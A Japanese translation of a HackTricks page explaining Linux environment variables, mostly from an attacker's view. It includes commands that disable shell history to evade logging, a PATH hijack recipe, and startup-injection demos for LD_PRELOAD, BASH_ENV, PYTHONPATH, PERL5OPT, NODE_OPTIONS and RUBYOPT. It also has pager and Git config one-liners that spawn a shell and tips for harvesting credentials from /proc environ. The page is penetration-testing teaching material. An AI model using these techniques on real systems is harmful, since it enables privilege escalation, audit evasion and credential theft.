# Linux 環境変数

{{#include ../../banners/hacktricks-training.md}}

## グローバル変数

グローバル変数は**子プロセス**に継承されます。

現在のセッション用にグローバル変数を作成するには、次のようにします：
```bash
export MYGLOBAL="hello world"
echo $MYGLOBAL #Prints: hello world
```
この変数は、現在のセッションおよびその子プロセスからアクセスできます。

次のようにして変数を**削除**できます。
```bash
unset MYGLOBAL
```
## Local variables

**local variables** は、**current shell/script** からのみ **accessed** できます。
```bash
LOCAL="my local"
echo $LOCAL
unset LOCAL
```
## 現在の変数を一覧表示
```bash
set
env
printenv
cat /proc/$$/environ
cat /proc/`python -c "import os; print(os.getppid())"`/environ
```
`/proc/*/environ` の内容は **NUL で区切られている**ため、通常は次の形式のほうが読みやすくなります:
```bash
tr '\0' '\n' </proc/$$/environ | sort -u
tr '\0' '\n' </proc/<PID>/environ | sort -u
```
**credentials** または継承された環境内の**興味深いサービス設定**を探している場合は、[Linux Post Exploitation](../post-exploitation/linux-post-exploitation/README.md) も確認してください。

## 共通の変数

From: [https://geek-university.com/linux/common-environment-variables/](https://geek-university.com/linux/common-environment-variables/)<sup>[[5]](#references)</sup>

- **DISPLAY** – **X** が使用するディスプレイ。この変数は通常 **:0.0** に設定され、現在のコンピューター上の最初のディスプレイを意味します。
- **EDITOR** – ユーザーが優先するテキストエディター。
- **HISTFILESIZE** – history file に含められる行数の最大値。
- **HISTSIZE** – ユーザーがセッションを終了したときに history file に追加される行数。
- **HOME** – ホームディレクトリ。
- **HOSTNAME** – コンピューターのホスト名。
- **LANG** – 現在の言語。
- **MAIL** – ユーザーのメールスプールの場所。通常は **/var/spool/mail/USER**。
- **MANPATH** – manual page の検索対象となるディレクトリの一覧。
- **OSTYPE** – オペレーティングシステムの種類。
- **PS1** – bash のデフォルトプロンプト。
- **PATH** – 相対パスや絶対パスを指定せず、ファイル名だけで実行したい binary file を保持するすべてのディレクトリのパス。
- **PWD** – 現在の working directory。
- **SHELL** – 現在の command shell へのパス（例: **/bin/bash**）。
- **TERM** – 現在の terminal type（例: **xterm**）。
- **TZ** – タイムゾーン。
- **USER** – 現在のユーザー名。

## hacking に有用な変数

すべての変数が同じように有用なわけではありません。攻撃者の観点では、**search path**、**startup file**、**dynamic linker の動作**、または**監査・logging**を変更する変数を優先してください。

### **HISTFILESIZE**

**この変数の値を 0 に変更**すると、**セッションを終了**したときに **history file**（\~/.bash_history）が**0 行に切り詰められます**。
```bash
export HISTFILESIZE=0
```
### **HISTSIZE**

**この変数の値を 0 に変更**すると、コマンドが**メモリ上の履歴に保持されなくなり**、**履歴ファイル**（\~/.bash_history）にも書き戻されなくなります。
```bash
export HISTSIZE=0
```
### **HISTCONTROL**

**この変数の値が `ignorespace` または `ignoreboth` に設定されている場合**、先頭に余分なスペースを付けたコマンドは履歴に保存されません。
```bash
export HISTCONTROL=ignorespace
```

```bash
$ echo "to save or"
$  echo "not to save"
```
### **HISTFILE**

**履歴ファイル**を**`/dev/null`**に指定するか、完全に unset します。これは通常、履歴サイズだけを変更するよりも信頼性が高くなります。
```bash
export HISTFILE=/dev/null
unset HISTFILE
```
### http_proxy & https_proxy

プロセスは、ここで宣言された **proxy** を使用して、**http または https** 経由でインターネットに接続します。
```bash
export http_proxy="http://10.10.10.10:8080"
export https_proxy="http://10.10.10.10:8080"
```
### all_proxy & no_proxy

- `all_proxy`: これをサポートするツールやプロトコルのデフォルトプロキシ。
- `no_proxy`: 直接接続するホスト、ドメイン、CIDR の bypass list。
```bash
export all_proxy="socks5h://10.10.10.10:1080"
export no_proxy="localhost,127.0.0.1,.corp.local,10.0.0.0/8"
```
ツールによっては、小文字と大文字のバリアントが使用される場合があります（`http_proxy`/`HTTP_PROXY`、`no_proxy`/`NO_PROXY`）。

### SSL_CERT_FILE & SSL_CERT_DIR

プロセスは、**これらの環境変数**で指定された証明書を信頼します。これは、**`curl`**、**`git`**、Python の HTTP クライアント、パッケージマネージャーなどのツールに、攻撃者が管理する CA を信頼させる際に役立ちます（例えば、interception proxy を正規のものに見せかけるため）。
```bash
export SSL_CERT_FILE=/path/to/ca-bundle.pem
export SSL_CERT_DIR=/path/to/ca-certificates
```
### **PATH**

privileged wrapper/script が **absolute paths** なしでコマンドを実行する場合、`PATH` 内の最初の attacker-controlled directory が優先されます。これは、`sudo`、cron jobs、shell wrappers、custom SUID helpers における多くの **PATH hijacks** の基盤となる primitive です。`env_keep+=PATH`、弱い `secure_path`、または `tar`、`service`、`cp`、`python` などを名前だけで呼び出す wrappers を探してください。
```bash
mkdir -p /dev/shm/bin
cat > /dev/shm/bin/tar <<'EOF'
#!/bin/sh
echo '[+] PATH hijack reached' >&2
id
EOF
chmod +x /dev/shm/bin/tar
PATH=/dev/shm/bin:$PATH vulnerable-wrapper
```
完全な `PATH` 悪用による privilege escalation chain については、[Linux Privilege Escalation](linux-privilege-escalation/README.md) を確認してください。

### **HOME & XDG_CONFIG_HOME**

`HOME` は単なるディレクトリ参照ではありません。多くのツールは、`$HOME` または `$XDG_CONFIG_HOME` から **dotfiles**、**plugins**、**per-user configuration** を自動的に読み込みます。privileged workflow がこれらの値を保持している場合、**config injection** は binary hijacking よりも容易になる可能性があります。
```bash
export HOME=/dev/shm/fakehome
export XDG_CONFIG_HOME=/dev/shm/fakehome/.config
mkdir -p "$XDG_CONFIG_HOME"
```
興味深いターゲットには、`.gitconfig`、`.wgetrc`、`.curlrc`、`.inputrc`、`.pythonrc.py`、さらに `.terraformrc` などのツール固有のファイルがあります。

### **LD_PRELOAD、LD_LIBRARY_PATH、LD_AUDIT**

これらの変数は**動的リンカ**に影響を与えます。

- `LD_PRELOAD`: 追加の共有オブジェクトを最初にロードするよう強制します。
- `LD_LIBRARY_PATH`: ライブラリ検索ディレクトリを先頭に追加します。
- `LD_AUDIT`: ライブラリのロードとシンボル解決を監視する auditor libraries をロードします。

特権コマンドがこれらを保持する場合、**hooking**、**instrumentation**、**privilege escalation** に非常に有用です。**secure-execution** モード（`AT_SECURE`、例: setuid/setgid/capabilities）では、loader がこれらの変数の多くを削除または制限します。ただし、この初期の loader stage で発生する parser bugs は、ターゲットプログラムより**前に**実行されるため、依然として影響が大きいものです。<sup>[[2]](#references)</sup>
```bash
env | grep -E '^LD_'
ldso=$(ls /lib64/ld-linux-*.so.* /lib/*-linux-gnu/ld-linux-*.so.* 2>/dev/null | head -n1)
"$ldso" --list-diagnostics /bin/true | head
"$ldso" --list-tunables /bin/true | head
```
### **GLIBC_TUNABLES**

`GLIBC_TUNABLES` は glibc の初期動作（allocator tunables など）を変更でき、exploit lab で非常に便利です。セキュリティの観点でも重要です。これは **dynamic loader が非常に早い段階で解析する** ためです。2023 年の **Looney Tunables** bug は、loader で解析される単一の環境変数が、SUID プログラムに対する **local privilege-escalation primitive** になり得ることを改めて示しました。<sup>[[6]](#references)</sup>
```bash
GLIBC_TUNABLES=glibc.malloc.tcache_count=0 ./binary
```
### **BASH_ENV & ENV**

**Bash** が **non-interactively** 起動されると、対象のスクリプトを実行する前に `BASH_ENV` を確認し、そのファイルを source します。Bash が `sh` として呼び出された場合、または POSIX-style の interactive mode では、`ENV` も参照されることがあります。これは、環境変数を攻撃者が制御できる場合に、shell wrapper を code execution に変える古典的な手法です。
```bash
cat > /tmp/pre.sh <<'EOF'
echo '[+] sourced before the target script'
EOF
BASH_ENV=/tmp/pre.sh bash -c 'echo target'
```
Bash 自体は、`-p` が使用されていない限り、**real/effective IDs が異なる**場合にこれらの startup files を無効化します。そのため、正確な挙動は wrapper が shell をどのように起動するかによって異なります。`setuid()`/`setgid()` を Bash の起動**前**に呼び出す privileged wrapper には注意してください。IDs が再び一致すると、Bash は通常なら無視する `BASH_ENV`、`ENV`、および関連する shell state を信頼する可能性があります。<sup>[[1]](#references)</sup>

### **PYTHONPATH, PYTHONHOME, PYTHONSTARTUP & PYTHONINSPECT**

これらの variables は Python の起動方法を変更します。

- `PYTHONPATH`: import search paths を先頭に追加します。
- `PYTHONHOME`: standard library tree を移動します。
- `PYTHONSTARTUP`: interactive prompt の前に file を実行します。
- `PYTHONINSPECT=1`: script の終了後に interactive mode に移行します。

これらは、制御可能な environment で Python を呼び出す maintenance scripts、debuggers、shells、および wrappers に対して有用です。`python -E` と `python -I` は、すべての `PYTHON*` variables を無視します。
```bash
mkdir -p /tmp/pylib
printf 'print("owned from PYTHONPATH")\n' > /tmp/pylib/htmod.py
PYTHONPATH=/tmp/pylib python3 -c 'import htmod'
PYTHONPATH=/tmp/pylib python3 -I -c 'import htmod'   # ignored in isolated mode
```
最近の実環境での例として、Ubuntu/Debian システムにおける 2024 年の **needrestart** LPE があります。root-owned scanner は、`/proc/<PID>/environ` から unprivileged process の `PYTHONPATH` をコピーし、その後 Python を実行していました。公開された exploit では、attacker-controlled path に `importlib/__init__.so` を配置することで、helper の hard-coded script が問題になる前に、Python 自身の初期化中に attacker code を実行させていました。<sup>[[3]](#references)</sup>

### **PERL5OPT & PERL5LIB**

Perl にも、同様に有用な startup variables があります。

- `PERL5LIB`: library directories を prepend します。
- `PERL5OPT`: すべての `perl` command line に指定されているかのように switches を inject します。

これにより **automatic module loading** を強制したり、target script が処理を開始する前に interpreter の動作を変更したりできます。Perl は **taint / setuid / setgid** context ではこれらの variables を無視しますが、通常の root-run wrappers、CI jobs、installers、custom sudoers rules では依然として非常に重要です。
```bash
mkdir -p /tmp/perllib
cat > /tmp/perllib/HT.pm <<'EOF'
package HT;
BEGIN { print "PERL5OPT_TRIGGERED\n" }
1;
EOF
PERL5LIB=/tmp/perllib PERL5OPT=-MHT perl -e 'print "target\n"'
```
### **NODE_OPTIONS**

`NODE_OPTIONS` は、環境を継承するすべての `node` プロセスに **Node.js CLI flags** を先頭追加します。そのため、最終的に Node を呼び出す wrappers、CI jobs、Electron helpers、sudo rules に対して有効です。攻撃で特に興味深い flags は通常、次のとおりです。

- `--require <file>`: target script の前に CommonJS file を preload します。
- `--import <module>`: target script の前に ES module を preload します。

Node は `NODE_OPTIONS` 内の一部の危険な flags を拒否しますが、`--require` と `--import` は明示的に許可されており、通常の command-line arguments より**前に**処理されます。<sup>[[4]](#references)</sup>
```bash
cat > /tmp/preload.js <<'EOF'
console.error('[+] NODE_OPTIONS preload reached')
EOF
NODE_OPTIONS='--require /tmp/preload.js' node -e 'console.log("target")'
```
リモートの gadget chain が間接的に `NODE_OPTIONS` を設定する場合（例えば、prototype-pollution から RCE へ至るケース）は、[こちらの別ページ](../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce.md)を確認してください。

### **RUBYLIB & RUBYOPT**

Ruby でも、同様の起動時悪用が可能です。

- `RUBYLIB`: Ruby の load path の先頭にディレクトリを追加します。
- `RUBYOPT`: すべての `ruby` invocation に `-r` などのコマンドラインオプションを注入します。
```bash
mkdir -p /tmp/rubylib
printf 'warn "[+] RUBYOPT preload reached"\n' > /tmp/rubylib/ht.rb
RUBYLIB=/tmp/rubylib RUBYOPT='-rht' ruby -e 'puts :target'
```
2024年の **needrestart** vulnerabilitiesは、これが単なるラボでの小技ではないことを示しました。`PYTHONPATH` abuseに対して脆弱だったのと同じroot-owned helperを利用して、attacker-controlledな`RUBYLIB`でRubyを実行させ、attacker directoryから`enc/encdb.so`をloadさせることも可能でした。<sup>[[3]](#references)</sup>

### **PAGER, MANPAGER, GIT_PAGER, GIT_EDITOR & LESSOPEN**

一部のツールは、environmentからpathを読み取るだけではありません。その値を**shell**、**editor**、または**input preprocessor**に渡します。そのため、privileged wrapperが`git`、`man`、`less`、または同様のtext viewerを実行する場合、次のvariablesは特に注目すべき対象になります。

- `PAGER`、`MANPAGER`、`GIT_PAGER`: pager commandを選択します。
- `GIT_EDITOR`、`VISUAL`、`EDITOR`: editor commandを選択します。多くの場合、argumentsも指定できます。
- `LESSOPEN`、`LESSCLOSE`: `less`がfileを開く際に実行するpre/post-processorを定義します。
```bash
PAGER='sh -c "exec sh 0<&1 1>&1"' man man

cat > /tmp/lesspipe.sh <<'EOF'
#!/bin/sh
echo '[+] LESSOPEN triggered' >&2
cat "$1"
EOF
chmod +x /tmp/lesspipe.sh
LESSOPEN='|/tmp/lesspipe.sh %s' less /etc/hosts
```
Git は、ディスクに触れることなく、`GIT_CONFIG_COUNT`、`GIT_CONFIG_KEY_<n>`、`GIT_CONFIG_VALUE_<n>` を使った **環境変数のみの設定注入** もサポートしています。
```bash
GIT_CONFIG_COUNT=1 \
GIT_CONFIG_KEY_0=core.pager \
GIT_CONFIG_VALUE_0='sh -c "exec sh 0<&1 1>&1"' \
git -p help
```
Post-exploitation の観点では、継承された環境に **credentials**、**proxy settings**、**service tokens**、または **cloud keys** が含まれていることも忘れないでください。`/proc/<PID>/environ` および `systemd` の `Environment=` hunting については、[Linux Post Exploitation](../post-exploitation/linux-post-exploitation/README.md) を確認してください。

### PS1

プロンプトの表示方法を変更します。

[**これは例です**](https://gist.github.com/carlospolop/43f7cd50f3deea972439af3222b68808)

Root:

![PERL5OPT & PERL5LIB - PS1: これは例です](<../images/image (897).png>)

通常の user:

![PERL5OPT & PERL5LIB - PS1: バックグラウンドで実行中の 1、2、3 個の job](<../images/image (740).png>)

バックグラウンドで実行中の 1、2、3 個の job:

![PERL5OPT & PERL5LIB - PS1: バックグラウンドで実行中の 1、2、3 個の job](<../images/image (145).png>)

バックグラウンド job が 1 つ、停止中の job が 1 つあり、最後の command が正常に終了しなかった場合:

![PERL5OPT & PERL5LIB - PS1: バックグラウンド job が 1 つ、停止中の job が 1 つあり、最後の command が正常に終了しなかった場合](<../images/image (715).png>)

## References

- [1] [GNU Bash Manual - Bash Startup Files](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html)
- [2] [ld.so(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [3] [Qualys - needrestart における LPE](https://www.qualys.com/2024/11/19/needrestart/needrestart.txt)
- [4] [Node.js CLI documentation - `NODE_OPTIONS`](https://nodejs.org/api/cli.html)
- [5] [Common environment variables - Geek University](https://geek-university.com/linux/common-environment-variables/)
- [6] [CVE-2023-4911: Looney Tunables - glibc の ld.so における Local Privilege Escalation - Qualys](https://blog.qualys.com/vulnerabilities-threat-research/2023/10/03/cve-2023-4911-looney-tunables-local-privilege-escalation-in-the-glibcs-ld-so)

{{#include ../../banners/hacktricks-training.md}}
